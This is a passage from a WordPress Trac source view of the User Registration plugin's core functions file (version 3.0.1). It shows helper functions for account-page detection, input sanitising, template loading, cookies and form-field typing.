## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fuser-registration%2Ftags%2F3.0.1%2Fincludes%2Ffunctions-ur-core.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* [Blame](/browser/user-registration/tags/3.0.1/includes/functions-ur-core.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/user-registration/tags/3.0.1/includes/functions-ur-core.php)

---

# [source:](/browser?order=name "Go to repository root") [user-registration](/browser/user-registration?order=name "View user-registration")/[tags](/browser/user-registration/tags?order=name "View tags")/[3.0.1](/browser/user-registration/tags/3.0.1?order=name "View 3.0.1")/[includes](/browser/user-registration/tags/3.0.1/includes?order=name "View includes")/[functions-ur-core.php](/browser/user-registration/tags/3.0.1/includes/functions-ur-core.php?order=name "View functions-ur-core.php")

View diff against:

View revision:

| [Last change](/changeset/2925707/user-registration/tags/3.0.1/includes/functions-ur-core.php "View differences") on this file was [2925707](/changeset/2925707/ "View changeset 2925707"), checked in by wpeverestdev, [19 months ago](/timeline?from=2023-06-14T06%3A40%3A27Z&precision=second "See timeline at 06/14/2023 06:40:27 AM") |
| --- |
| Update to version 3.0.1 from GitHub |
| **File size:** 126.0 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | /\*\* |
| [3](#L3) | \* UserRegistration Functions. |
| [4](#L4) | \* |
| [5](#L5) | \* General core functions available on both the front-end and admin. |
| [6](#L6) | \* |
| [7](#L7) | \* @package UserRegistration/Functions |
| [8](#L8) | \* @version 1.0.0 |
| [9](#L9) | \*/ |
| [10](#L10) |  |
| [11](#L11) | defined( 'ABSPATH' ) || exit; |
| [12](#L12) |  |
| [13](#L13) | // Include core functions (available in both admin and frontend). |
| [14](#L14) | require UR\_ABSPATH . 'includes/functions-ur-page.php'; |
| [15](#L15) | require UR\_ABSPATH . 'includes/functions-ur-account.php'; |
| [16](#L16) | require UR\_ABSPATH . 'includes/functions-ur-deprecated.php'; |
| [17](#L17) |  |
| [18](#L18) | /\*\* |
| [19](#L19) | \* Define a constant if it is not already defined. |
| [20](#L20) | \* |
| [21](#L21) | \* @param string $name  Constant name. |
| [22](#L22) | \* @param string $value Value. |
| [23](#L23) | \*/ |
| [24](#L24) | function ur\_maybe\_define\_constant( $name, $value ) { |
| [25](#L25) | if ( ! defined( $name ) ) { |
| [26](#L26) | define( $name, $value ); |
| [27](#L27) | } |
| [28](#L28) | } |
| [29](#L29) |  |
| [30](#L30) | if ( ! function\_exists( 'is\_ur\_endpoint\_url' ) ) { |
| [31](#L31) |  |
| [32](#L32) | /\*\* |
| [33](#L33) | \* Check if an endpoint is showing. |
| [34](#L34) | \* |
| [35](#L35) | \* @param string $endpoint User registration myaccount endpoints. |
| [36](#L36) | \* |
| [37](#L37) | \* @return bool |
| [38](#L38) | \*/ |
| [39](#L39) | function is\_ur\_endpoint\_url( $endpoint = false ) { |
| [40](#L40) | global $wp; |
| [41](#L41) |  |
| [42](#L42) | $ur\_endpoints = UR()->query->get\_query\_vars(); |
| [43](#L43) |  |
| [44](#L44) | if ( false !== $endpoint ) { |
| [45](#L45) | if ( ! isset( $ur\_endpoints[ $endpoint ] ) ) { |
| [46](#L46) | return false; |
| [47](#L47) | } else { |
| [48](#L48) | $endpoint\_var = $ur\_endpoints[ $endpoint ]; |
| [49](#L49) | } |
| [50](#L50) |  |
| [51](#L51) | return isset( $wp->query\_vars[ $endpoint\_var ] ); |
| [52](#L52) | } else { |
| [53](#L53) | foreach ( $ur\_endpoints as $key => $value ) { |
| [54](#L54) | if ( isset( $wp->query\_vars[ $key ] ) ) { |
| [55](#L55) | return true; |
| [56](#L56) | } |
| [57](#L57) | } |
| [58](#L58) |  |
| [59](#L59) | return false; |
| [60](#L60) | } |
| [61](#L61) | } |
| [62](#L62) | } |
| [63](#L63) |  |
| [64](#L64) | if ( ! function\_exists( 'is\_ur\_account\_page' ) ) { |
| [65](#L65) |  |
| [66](#L66) | /\*\* |
| [67](#L67) | \* Returns true when viewing an account page. |
| [68](#L68) | \* |
| [69](#L69) | \* @return bool |
| [70](#L70) | \*/ |
| [71](#L71) | function is\_ur\_account\_page() { |
| [72](#L72) | return is\_page( ur\_get\_page\_id( 'myaccount' ) ) || ur\_post\_content\_has\_shortcode( 'user\_registration\_my\_account' ) || apply\_filters( 'user\_registration\_is\_account\_page', false ); |
| [73](#L73) | } |
| [74](#L74) | } |
| [75](#L75) |  |
| [76](#L76) | if ( ! function\_exists( 'is\_ur\_login\_page' ) ) { |
| [77](#L77) |  |
| [78](#L78) | /\*\* |
| [79](#L79) | \* Returns true when viewing an login page. |
| [80](#L80) | \* |
| [81](#L81) | \* @return bool |
| [82](#L82) | \*/ |
| [83](#L83) | function is\_ur\_login\_page() { |
| [84](#L84) | return is\_page( ur\_get\_page\_id( 'login' ) ) || ur\_post\_content\_has\_shortcode( 'user\_registration\_login' ) || apply\_filters( 'user\_registration\_is\_login\_page', false ); |
| [85](#L85) | } |
| [86](#L86) | } |
| [87](#L87) |  |
| [88](#L88) | if ( ! function\_exists( 'is\_ur\_edit\_account\_page' ) ) { |
| [89](#L89) |  |
| [90](#L90) | /\*\* |
| [91](#L91) | \* Check for edit account page. |
| [92](#L92) | \* Returns true when viewing the edit account page. |
| [93](#L93) | \* |
| [94](#L94) | \* @return bool |
| [95](#L95) | \*/ |
| [96](#L96) | function is\_ur\_edit\_account\_page() { |
| [97](#L97) | global $wp; |
| [98](#L98) |  |
| [99](#L99) | return ( is\_ur\_account\_page() && isset( $wp->query\_vars['edit-password'] ) ); |
| [100](#L100) | } |
| [101](#L101) | } |
| [102](#L102) |  |
| [103](#L103) | if ( ! function\_exists( 'is\_ur\_lost\_password\_page' ) ) { |
| [104](#L104) |  |
| [105](#L105) | /\*\* |
| [106](#L106) | \* Returns true when viewing the lost password page. |
| [107](#L107) | \* |
| [108](#L108) | \* @return bool |
| [109](#L109) | \*/ |
| [110](#L110) | function is\_ur\_lost\_password\_page() { |
| [111](#L111) | global $wp; |
| [112](#L112) |  |
| [113](#L113) | return ( is\_ur\_account\_page() && isset( $wp->query\_vars['ur-lost-password'] ) ); |
| [114](#L114) | } |
| [115](#L115) | } |
| [116](#L116) |  |
| [117](#L117) | /\*\* |
| [118](#L118) | \* Clean variables using sanitize\_text\_field. Arrays are cleaned recursively. |
| [119](#L119) | \* Non-scalar values are ignored. |
| [120](#L120) | \* |
| [121](#L121) | \* @param  string|array $var Variable. |
| [122](#L122) | \* |
| [123](#L123) | \* @return string|array |
| [124](#L124) | \*/ |
| [125](#L125) | function ur\_clean( $var ) { |
| [126](#L126) | if ( is\_array( $var ) ) { |
| [127](#L127) | return array\_map( 'ur\_clean', $var ); |
| [128](#L128) | } else { |
| [129](#L129) | return is\_scalar( $var ) ? sanitize\_text\_field( $var ) : $var; |
| [130](#L130) | } |
| [131](#L131) | } |
| [132](#L132) |  |
| [133](#L133) | /\*\* |
| [134](#L134) | \* Sanitize a string destined to be a tooltip. |
| [135](#L135) | \* |
| [136](#L136) | \* @since  1.0.0  Tooltips are encoded with htmlspecialchars to prevent XSS. Should not be used in conjunction with esc\_attr() |
| [137](#L137) | \* |
| [138](#L138) | \* @param  string $var Value to sanitize. |
| [139](#L139) | \* |
| [140](#L140) | \* @return string |
| [141](#L141) | \*/ |
| [142](#L142) | function ur\_sanitize\_tooltip( $var ) { |
| [143](#L143) | return htmlspecialchars( |
| [144](#L144) | wp\_kses( |
| [145](#L145) | html\_entity\_decode( $var ), |
| [146](#L146) | array( |
| [147](#L147) | 'br'     => array(), |
| [148](#L148) | 'em'     => array(), |
| [149](#L149) | 'strong' => array(), |
| [150](#L150) | 'small'  => array(), |
| [151](#L151) | 'span'   => array(), |
| [152](#L152) | 'ul'     => array(), |
| [153](#L153) | 'li'     => array(), |
| [154](#L154) | 'ol'     => array(), |
| [155](#L155) | 'p'      => array(), |
| [156](#L156) | ) |
| [157](#L157) | ) |
| [158](#L158) | ); |
| [159](#L159) | } |
| [160](#L160) |  |
| [161](#L161) | /\*\* |
| [162](#L162) | \* Format dimensions for display. |
| [163](#L163) | \* |
| [164](#L164) | \* @since  1.7.0 |
| [165](#L165) | \* @param  array $dimensions Array of dimensions. |
| [166](#L166) | \* @param  array $unit Unit, defaults to 'px'. |
| [167](#L167) | \* @return string |
| [168](#L168) | \*/ |
| [169](#L169) | function ur\_sanitize\_dimension\_unit( $dimensions = array(), $unit = 'px' ) { |
| [170](#L170) | return ur\_array\_to\_string( ur\_suffix\_array( $dimensions, $unit ) ); |
| [171](#L171) | } |
| [172](#L172) |  |
| [173](#L173) | /\*\* |
| [174](#L174) | \* Add a suffix into an array. |
| [175](#L175) | \* |
| [176](#L176) | \* @since  1.7.0 |
| [177](#L177) | \* @param  array  $array  Raw array data. |
| [178](#L178) | \* @param  string $suffix Suffix to be added. |
| [179](#L179) | \* @return array Modified array with suffix added. |
| [180](#L180) | \*/ |
| [181](#L181) | function ur\_suffix\_array( $array = array(), $suffix = '' ) { |
| [182](#L182) | return preg\_filter( '/$/', $suffix, $array ); |
| [183](#L183) | } |
| [184](#L184) | /\*\* |
| [185](#L185) | \* Implode an array into a string by $glue and remove empty values. |
| [186](#L186) | \* |
| [187](#L187) | \* @since  1.7.0 |
| [188](#L188) | \* @param  array  $array Array to convert. |
| [189](#L189) | \* @param  string $glue  Glue, defaults to ' '. |
| [190](#L190) | \* @return string |
| [191](#L191) | \*/ |
| [192](#L192) | function ur\_array\_to\_string( $array = array(), $glue = ' ' ) { |
| [193](#L193) | return is\_string( $array ) ? $array : implode( $glue, array\_filter( $array ) ); |
| [194](#L194) | } |
| [195](#L195) | /\*\* |
| [196](#L196) | \* Explode a string into an array by $delimiter and remove empty values. |
| [197](#L197) | \* |
| [198](#L198) | \* @since  1.7.0 |
| [199](#L199) | \* @param  string $string    String to convert. |
| [200](#L200) | \* @param  string $delimiter Delimiter, defaults to ','. |
| [201](#L201) | \* @return array |
| [202](#L202) | \*/ |
| [203](#L203) | function ur\_string\_to\_array( $string, $delimiter = ',' ) { |
| [204](#L204) | return is\_array( $string ) ? $string : array\_filter( explode( $delimiter, $string ) ); |
| [205](#L205) | } |
| [206](#L206) |  |
| [207](#L207) | /\*\* |
| [208](#L208) | \* Converts a string (e.g. 'yes' or 'no') to a bool. |
| [209](#L209) | \* |
| [210](#L210) | \* @param string $string String to convert. |
| [211](#L211) | \* @return bool |
| [212](#L212) | \*/ |
| [213](#L213) | function ur\_string\_to\_bool( $string ) { |
| [214](#L214) | return is\_bool( $string ) ? $string : ( 'yes' === $string || 'on' === $string || 1 === $string || 'true' === $string || '1' === $string || 'today' === $string || 'range' === $string ); |
| [215](#L215) | } |
| [216](#L216) |  |
| [217](#L217) | /\*\* |
| [218](#L218) | \* Converts a bool to a 'yes' or 'no'. |
| [219](#L219) | \* |
| [220](#L220) | \* @param bool $bool String to convert. |
| [221](#L221) | \* @return string |
| [222](#L222) | \*/ |
| [223](#L223) | function ur\_bool\_to\_string( $bool ) { |
| [224](#L224) | if ( ! is\_bool( $bool ) ) { |
| [225](#L225) | $bool = ur\_string\_to\_bool( $bool ); |
| [226](#L226) | } |
| [227](#L227) | return true === $bool ? 'yes' : 'no'; |
| [228](#L228) | } |
| [229](#L229) |  |
| [230](#L230) | /\*\* |
| [231](#L231) | \* Get other templates (e.g. my account) passing attributes and including the file. |
| [232](#L232) | \* |
| [233](#L233) | \* @param string $template\_name Template Name. |
| [234](#L234) | \* @param array  $args Extra arguments(default: array()). |
| [235](#L235) | \* @param string $template\_path Path of template provided (default: ''). |
| [236](#L236) | \* @param string $default\_path  Default path of template provided(default: ''). |
| [237](#L237) | \*/ |
| [238](#L238) | function ur\_get\_template( $template\_name, $args = array(), $template\_path = '', $default\_path = '' ) { |
| [239](#L239) | if ( ! empty( $args ) && is\_array( $args ) ) { |
| [240](#L240) | extract( $args ); // phpcs:ignore |
| [241](#L241) | } |
| [242](#L242) |  |
| [243](#L243) | $located = ur\_locate\_template( $template\_name, $template\_path, $default\_path ); |
| [244](#L244) |  |
| [245](#L245) | // Allow 3rd party plugin filter template file from their plugin. |
| [246](#L246) | $located = apply\_filters( 'ur\_get\_template', $located, $template\_name, $args, $template\_path, $default\_path ); |
| [247](#L247) |  |
| [248](#L248) | if ( ! file\_exists( $located ) ) { |
| [249](#L249) | \_doing\_it\_wrong( \_\_FUNCTION\_\_, sprintf( '<code>%s</code> does not exist.', esc\_html( $located ) ), '1.0' ); |
| [250](#L250) |  |
| [251](#L251) | return; |
| [252](#L252) | } |
| [253](#L253) |  |
| [254](#L254) | do\_action( 'user\_registration\_before\_template\_part', $template\_name, $template\_path, $located, $args ); |
| [255](#L255) |  |
| [256](#L256) | include $located; |
| [257](#L257) |  |
| [258](#L258) | do\_action( 'user\_registration\_after\_template\_part', $template\_name, $template\_path, $located, $args ); |
| [259](#L259) | } |
| [260](#L260) |  |
| [261](#L261) | /\*\* |
| [262](#L262) | \* Locate a template and return the path for inclusion. |
| [263](#L263) | \* |
| [264](#L264) | \* This is the load order: |
| [265](#L265) | \* |
| [266](#L266) | \*        yourtheme        /    $template\_path    /    $template\_name |
| [267](#L267) | \*        yourtheme        /    $template\_name |
| [268](#L268) | \*        $default\_path    /    $template\_name |
| [269](#L269) | \* |
| [270](#L270) | \* @param string $template\_name Template Name. |
| [271](#L271) | \* @param string $template\_path Path of template provided (default: ''). |
| [272](#L272) | \* @param string $default\_path  Default path of template provided(default: ''). |
| [273](#L273) | \* |
| [274](#L274) | \* @return string |
| [275](#L275) | \*/ |
| [276](#L276) | function ur\_locate\_template( $template\_name, $template\_path = '', $default\_path = '' ) { |
| [277](#L277) | if ( ! $template\_path ) { |
| [278](#L278) | $template\_path = UR()->template\_path(); |
| [279](#L279) | } |
| [280](#L280) |  |
| [281](#L281) | if ( ! $default\_path ) { |
| [282](#L282) | $default\_path = UR()->plugin\_path() . '/templates/'; |
| [283](#L283) | } |
| [284](#L284) |  |
| [285](#L285) | // Look within passed path within the theme - this is priority. |
| [286](#L286) | $template = locate\_template( |
| [287](#L287) | array( |
| [288](#L288) | trailingslashit( $template\_path ) . $template\_name, |
| [289](#L289) | $template\_name, |
| [290](#L290) | ) |
| [291](#L291) | ); |
| [292](#L292) |  |
| [293](#L293) | // Get default template. |
| [294](#L294) | if ( ! $template || UR\_TEMPLATE\_DEBUG\_MODE ) { |
| [295](#L295) | $template = $default\_path . $template\_name; |
| [296](#L296) | } |
| [297](#L297) |  |
| [298](#L298) | // Return what we found. |
| [299](#L299) | return apply\_filters( 'user\_registration\_locate\_template', $template, $template\_name, $template\_path ); |
| [300](#L300) | } |
| [301](#L301) |  |
| [302](#L302) | /\*\* |
| [303](#L303) | \* Display a UserRegistration help tip. |
| [304](#L304) | \* |
| [305](#L305) | \* @param  string $tip        Help tip text. |
| [306](#L306) | \* @param  bool   $allow\_html Allow sanitized HTML if true or escape. |
| [307](#L307) | \* @param string $classname Classname. |
| [308](#L308) | \* |
| [309](#L309) | \* @return string |
| [310](#L310) | \*/ |
| [311](#L311) | function ur\_help\_tip( $tip, $allow\_html = false, $classname = 'user-registration-help-tip' ) { |
| [312](#L312) | if ( $allow\_html ) { |
| [313](#L313) | $tip = ur\_sanitize\_tooltip( $tip ); |
| [314](#L314) | } else { |
| [315](#L315) | $tip = esc\_attr( $tip ); |
| [316](#L316) | } |
| [317](#L317) |  |
| [318](#L318) | return sprintf( '<span class="%s" data-tip="%s"></span>', $classname, $tip ); |
| [319](#L319) | } |
| [320](#L320) |  |
| [321](#L321) | /\*\* |
| [322](#L322) | \* Checks whether the content passed contains a specific short code. |
| [323](#L323) | \* |
| [324](#L324) | \* @param  string $tag Shortcode tag to check. |
| [325](#L325) | \* |
| [326](#L326) | \* @return bool |
| [327](#L327) | \*/ |
| [328](#L328) | function ur\_post\_content\_has\_shortcode( $tag = '' ) { |
| [329](#L329) | global $post; |
| [330](#L330) | $new\_shortcode = ''; |
| [331](#L331) | $wp\_version    = '5.0'; |
| [332](#L332) | if ( version\_compare( $GLOBALS['wp\_version'], $wp\_version, '>=' ) ) { |
| [333](#L333) | if ( is\_object( $post ) ) { |
| [334](#L334) | $blocks = parse\_blocks( $post->post\_content ); |
| [335](#L335) | foreach ( $blocks as $block ) { |
| [336](#L336) |  |
| [337](#L337) | if ( ( 'core/shortcode' === $block['blockName'] || 'core/paragraph' === $block['blockName'] ) && isset( $block['innerHTML'] ) ) { |
| [338](#L338) | $new\_shortcode = $block['innerHTML']; |
| [339](#L339) | } elseif ( 'user-registration/form-selector' === $block['blockName'] && isset( $block['attrs']['shortcode'] ) ) { |
| [340](#L340) | $new\_shortcode = '[' . $block['attrs']['shortcode'] . ']'; |
| [341](#L341) | } |
| [342](#L342) | } |
| [343](#L343) | } |
| [344](#L344) | return ( is\_singular() || is\_front\_page() ) && is\_a( $post, 'WP\_Post' ) && has\_shortcode( $new\_shortcode, $tag ); |
| [345](#L345) | } else { |
| [346](#L346) | return ( is\_singular() || is\_front\_page() ) && is\_a( $post, 'WP\_Post' ) && has\_shortcode( $post->post\_content, $tag ); |
| [347](#L347) | } |
| [348](#L348) | } |
| [349](#L349) |  |
| [350](#L350) | /\*\* |
| [351](#L351) | \* Wrapper for ur\_doing\_it\_wrong. |
| [352](#L352) | \* |
| [353](#L353) | \* @since  1.0.0 |
| [354](#L354) | \* |
| [355](#L355) | \* @param  string $function Callback function name. |
| [356](#L356) | \* @param  string $message Message to display. |
| [357](#L357) | \* @param  string $version Version of the plugin. |
| [358](#L358) | \*/ |
| [359](#L359) | function ur\_doing\_it\_wrong( $function, $message, $version ) { |
| [360](#L360) | $message .= ' Backtrace: ' . wp\_debug\_backtrace\_summary(); |
| [361](#L361) |  |
| [362](#L362) | if ( defined( 'DOING\_AJAX' ) ) { |
| [363](#L363) | do\_action( 'doing\_it\_wrong\_run', $function, $message, $version ); |
| [364](#L364) | error\_log( "{$function} was called incorrectly. {$message}. This message was added in version {$version}." ); |
| [365](#L365) | } else { |
| [366](#L366) | \_doing\_it\_wrong( esc\_html( $function ), esc\_html( $message ), esc\_html( $version ) ); |
| [367](#L367) | } |
| [368](#L368) | } |
| [369](#L369) |  |
| [370](#L370) | /\*\* |
| [371](#L371) | \* Set a cookie - wrapper for setcookie using WP constants. |
| [372](#L372) | \* |
| [373](#L373) | \* @param  string  $name   Name of the cookie being set. |
| [374](#L374) | \* @param  string  $value  Value of the cookie. |
| [375](#L375) | \* @param  integer $expire Expiry of the cookie. |
| [376](#L376) | \* @param  string  $secure Whether the cookie should be served only over https. |
| [377](#L377) | \*/ |
| [378](#L378) | function ur\_setcookie( $name, $value, $expire = 0, $secure = false ) { |
| [379](#L379) | if ( ! headers\_sent() ) { |
| [380](#L380) | setcookie( $name, $value, $expire, COOKIEPATH ? COOKIEPATH : '/', COOKIE\_DOMAIN, $secure ); |
| [381](#L381) | } elseif ( defined( 'WP\_DEBUG' ) && WP\_DEBUG ) { |
| [382](#L382) | headers\_sent( $file, $line ); |
| [383](#L383) | trigger\_error( "{$name} cookie cannot be set - headers already sent by {$file} on line {$line}", E\_USER\_NOTICE ); //phpcs:ignore |
| [384](#L384) | } |
| [385](#L385) | } |
| [386](#L386) |  |
| [387](#L387) | /\*\* |
| [388](#L388) | \* Read in UserRegistration headers when reading plugin headers. |
| [389](#L389) | \* |
| [390](#L390) | \* @since  1.1.0 |
| [391](#L391) | \* |
| [392](#L392) | \* @param  array $headers header. |
| [393](#L393) | \* |
| [394](#L394) | \* @return array $headers |
| [395](#L395) | \*/ |
| [396](#L396) | function ur\_enable\_ur\_plugin\_headers( $headers ) { |
| [397](#L397) | if ( ! class\_exists( 'UR\_Plugin\_Updates', false ) ) { |
| [398](#L398) | include\_once dirname( \_\_FILE\_\_ ) . '/admin/updater/class-ur-plugin-updates.php'; |
| [399](#L399) | } |
| [400](#L400) |  |
| [401](#L401) | $headers['URRequires'] = UR\_Plugin\_Updates::VERSION\_REQUIRED\_HEADER; |
| [402](#L402) | $headers['URTested']   = UR\_Plugin\_Updates::VERSION\_TESTED\_HEADER; |
| [403](#L403) |  |
| [404](#L404) | return $headers; |
| [405](#L405) | } |
| [406](#L406) |  |
| [407](#L407) | add\_filter( 'extra\_plugin\_headers', 'ur\_enable\_ur\_plugin\_headers' ); |
| [408](#L408) |  |
| [409](#L409) | /\*\* |
| [410](#L410) | \* Set field type for all registrered field keys |
| [411](#L411) | \* |
| [412](#L412) | \* @param  string $field\_key field's field key. |
| [413](#L413) | \* @return string $field\_type |
| [414](#L414) | \*/ |
| [415](#L415) | function ur\_get\_field\_type( $field\_key ) { |
| [416](#L416) | $fields = ur\_get\_registered\_form\_fields(); |
| [417](#L417) |  |
| [418](#L418) | $field\_type = 'text'; |
| [419](#L419) |  |
| [420](#L420) | if ( in\_array( $field\_key, $fields ) ) { |
| [421](#L421) |  |
| [422](#L422) | switch ( $field\_key ) { |
| [423](#L423) |  |
| [424](#L424) | case 'user\_email': |
| [425](#L425) | case 'user\_confirm\_email': |
| [426](#L426) | case 'email': |
| [427](#L427) | $field\_type = 'email'; |
| [428](#L428) | break; |
| [429](#L429) | case 'user\_confirm\_password': |
| [430](#L430) | case 'password': |
| [431](#L431) | case 'user\_pass': |
| [432](#L432) | $field\_type = 'password'; |
| [433](#L433) | break; |
| [434](#L434) | case 'user\_login': |
| [435](#L435) | case 'nickname': |
| [436](#L436) | case 'first\_name': |
| [437](#L437) | case 'last\_name': |
| [438](#L438) | case 'display\_name': |
| [439](#L439) | case 'text': |
| [440](#L440) | $field\_type = 'text'; |
| [441](#L441) | break; |
| [442](#L442) | case 'user\_url': |
| [443](#L443) | $field\_type = 'url'; |
| [444](#L444) | break; |
| [445](#L445) | case 'description': |
| [446](#L446) | case 'textarea': |
| [447](#L447) | $field\_type = 'textarea'; |
| [448](#L448) | break; |
| [449](#L449) | case 'select': |
| [450](#L450) | case 'country': |
| [451](#L451) | $field\_type = 'select'; |
| [452](#L452) | break; |
| [453](#L453) | case 'file': |
| [454](#L454) | $field\_type = 'file'; |
| [455](#L455) | break; |
| [456](#L456) | case 'privacy\_policy': |
| [457](#L457) | case 'mailchimp': |
| [458](#L458) | case 'mailerlite': |
| [459](#L459) | case 'checkbox': |
| [460](#L460) | $field\_type = 'checkbox'; |
| [461](#L461) | break; |
| [462](#L462) | case 'number': |
| [463](#L463) | $field\_type = 'number'; |
| [464](#L464) | break; |
| [465](#L465) | case 'date': |
| [466](#L466) | $field\_type = 'date'; |
| [467](#L467) | break; |
| [468](#L468) | case 'radio': |
| [469](#L469) | $field\_type = 'radio'; |
| [470](#L470) | break; |
| [471](#L471) | } |
| [472](#L472) | } |
| [473](#L473) |  |
| [474](#L474) | return apply\_filters( 'user\_registration\_field\_keys', $field\_type, $field\_key ); |
| [475](#L475) | } |
| [476](#L476) |  |
| [477](#L477) | /\*\* |
| [478](#L478) | \* Get user table fields. |
| [479](#L479) | \* |
| [480](#L480) | \* @return array |
| [481](#L481) | \*/ |
| [482](#L482) | function ur\_get\_user\_table\_fields() { |
| [483](#L483) | return apply\_filters( |
| [484](#L484) | 'user\_registration\_user\_table\_fields', |
| [485](#L485) | array( |
| [486](#L486) | 'user\_email', |
| [487](#L487) | 'user\_pass', |
| [488](#L488) | 'user\_login', |
| [489](#L489) | 'user\_url', |
| [490](#L490) | 'display\_name', |
| [491](#L491) | ) |
| [492](#L492) | ); |
| [493](#L493) | } |
| [494](#L494) |  |
| [495](#L495) | /\*\* |
| [496](#L496) | \* Get required fields. |
| [497](#L497) | \* |
| [498](#L498) | \* @return array |
| [499](#L499) | \*/ |
| [500](#L500) | function ur\_get\_required\_fields() { |
| [501](#L501) | return apply\_filters( |
| [502](#L502) | 'user\_registration\_required\_form\_fields', |
| [503](#L503) | array( |
| [504](#L504) | 'user\_email', |
| [505](#L505) | 'user\_pass', |
| [506](#L506) | ) |
| [507](#L507) | ); |
| [508](#L508) | } |
| [509](#L509) |  |
| [510](#L510) | /\*\* |
| [511](#L511) | \* Get one time draggable fields fields. |
| [512](#L512) | \* |
| [513](#L513) | \* @return array |
| [514](#L514) | \*/ |
| [515](#L515) | function ur\_get\_one\_time\_draggable\_fields() { |
| [516](#L516) | $form\_fields = ur\_get\_user\_field\_only(); |
| [517](#L517) | return apply\_filters( 'user\_registration\_one\_time\_draggable\_form\_fields', $form\_fields ); |
| [518](#L518) | } |
| [519](#L519) |  |
| [520](#L520) | /\*\* |
| [521](#L521) | \* Get fields excluding in profile tab |
| [522](#L522) | \* |
| [523](#L523) | \* @return array |
| [524](#L524) | \*/ |
| [525](#L525) | function ur\_exclude\_profile\_details\_fields() { |
| [526](#L526) |  |
| [527](#L527) | $fields\_to\_exclude = array( |
| [528](#L528) | 'user\_pass', |
| [529](#L529) | 'user\_confirm\_password', |
| [530](#L530) | 'user\_confirm\_email', |
| [531](#L531) | 'invite\_code', |
| [532](#L532) | 'learndash\_course', |
| [533](#L533) | ); |
| [534](#L534) |  |
| [535](#L535) | // Check if the my account page contains [user\_registration\_my\_account] shortcode. |
| [536](#L536) | if ( ur\_post\_content\_has\_shortcode( 'user\_registration\_my\_account' ) || ur\_post\_content\_has\_shortcode( 'user\_registration\_edit\_profile' ) ) { |
| [537](#L537) | // Push profile\_picture field to fields\_to\_exclude array. |
| [538](#L538) | array\_push( $fields\_to\_exclude, 'profile\_picture' ); |
| [539](#L539) | } |
| [540](#L540) |  |
| [541](#L541) | return apply\_filters( |
| [542](#L542) | 'user\_registration\_exclude\_profile\_fields', |
| [543](#L543) | $fields\_to\_exclude |
| [544](#L544) | ); |
| [545](#L545) | } |
| [546](#L546) |  |
| [547](#L547) | /\*\* |
| [548](#L548) | \* Get readonly fields in profile tab |
| [549](#L549) | \* |
| [550](#L550) | \* @return array |
| [551](#L551) | \*/ |
| [552](#L552) | function ur\_readonly\_profile\_details\_fields() { |
| [553](#L553) | return apply\_filters( |
| [554](#L554) | 'user\_registration\_readonly\_profile\_fields', |
| [555](#L555) | array( |
| [556](#L556) | 'user\_login'            => array( |
| [557](#L557) | 'message' => \_\_( 'Username can not be changed.', 'user-registration' ), |
| [558](#L558) | ), |
| [559](#L559) | 'user\_pass'             => array( |
| [560](#L560) | 'value'   => 'password', |
| [561](#L561) | 'message' => \_\_( 'Passowrd can not be changed.', 'user-registration' ), |
| [562](#L562) | ), |
| [563](#L563) | 'user\_confirm\_password' => array( |
| [564](#L564) | 'value'   => 'password', |
| [565](#L565) | 'message' => \_\_( 'Confirm password can not be changed.', 'user-registration' ), |
| [566](#L566) | ), |
| [567](#L567) | 'user\_confirm\_email'    => array( |
| [568](#L568) | 'message' => \_\_( 'Confirm email can not be changed.', 'user-registration' ), |
| [569](#L569) | ), |
| [570](#L570) | ) |
| [571](#L571) | ); |
| [572](#L572) | } |
| [573](#L573) |  |
| [574](#L574) | /\*\* |
| [575](#L575) | \* Get profile detail fields. |
| [576](#L576) | \* |
| [577](#L577) | \* @deprecated 1.4.1 |
| [578](#L578) | \* @return void |
| [579](#L579) | \*/ |
| [580](#L580) | function ur\_get\_account\_details\_fields() { |
| [581](#L581) | ur\_deprecated\_function( 'ur\_get\_account\_details\_fields', '1.4.1', 'ur\_exclude\_profile\_details\_fields' ); |
| [582](#L582) | } |
| [583](#L583) |  |
| [584](#L584) | /\*\* |
| [585](#L585) | \* Get all fields appearing in profile tab. |
| [586](#L586) | \* |
| [587](#L587) | \* @return array |
| [588](#L588) | \*/ |
| [589](#L589) | function ur\_get\_user\_profile\_field\_only() { |
| [590](#L590) | $user\_fields = array\_diff( ur\_get\_registered\_form\_fields(), ur\_exclude\_profile\_details\_fields() ); |
| [591](#L591) | return apply\_filters( 'user\_registration\_user\_profile\_field\_only', $user\_fields ); |
| [592](#L592) | } |
| [593](#L593) |  |
| [594](#L594) | /\*\* |
| [595](#L595) | \* All fields to update without adding prefix. |
| [596](#L596) | \* |
| [597](#L597) | \* @return array |
| [598](#L598) | \*/ |
| [599](#L599) | function ur\_get\_fields\_without\_prefix() { |
| [600](#L600) | $fields = ur\_get\_user\_field\_only(); |
| [601](#L601) | return apply\_filters( 'user\_registration\_fields\_without\_prefix', $fields ); |
| [602](#L602) |  |
| [603](#L603) | } |
| [604](#L604) |  |
| [605](#L605) | /\*\* |
| [606](#L606) | \* Get all default fields by WordPress. |
| [607](#L607) | \* |
| [608](#L608) | \* @return array |
| [609](#L609) | \*/ |
| [610](#L610) | function ur\_get\_user\_field\_only() { |
| [611](#L611) | return apply\_filters( |
| [612](#L612) | 'user\_registration\_user\_form\_fields', |
| [613](#L613) | array( |
| [614](#L614) | 'user\_email', |
| [615](#L615) | 'user\_confirm\_email', |
| [616](#L616) | 'user\_pass', |
| [617](#L617) | 'user\_confirm\_password', |
| [618](#L618) | 'user\_login', |
| [619](#L619) | 'nickname', |
| [620](#L620) | 'first\_name', |
| [621](#L621) | 'last\_name', |
| [622](#L622) | 'user\_url', |
| [623](#L623) | 'display\_name', |
| [624](#L624) | 'description', |
| [625](#L625) | ) |
| [626](#L626) | ); |
| [627](#L627) | } |
| [628](#L628) |  |
| [629](#L629) | /\*\* |
| [630](#L630) | \* Get all extra form fields |
| [631](#L631) | \* |
| [632](#L632) | \* @return array |
| [633](#L633) | \*/ |
| [634](#L634) | function ur\_get\_other\_form\_fields() { |
| [635](#L635) | $registered  = ur\_get\_registered\_form\_fields(); |
| [636](#L636) | $user\_fields = ur\_get\_user\_field\_only(); |
| [637](#L637) | $result      = array\_diff( $registered, $user\_fields ); |
| [638](#L638) |  |
| [639](#L639) | return apply\_filters( 'user\_registration\_other\_form\_fields', $result ); |
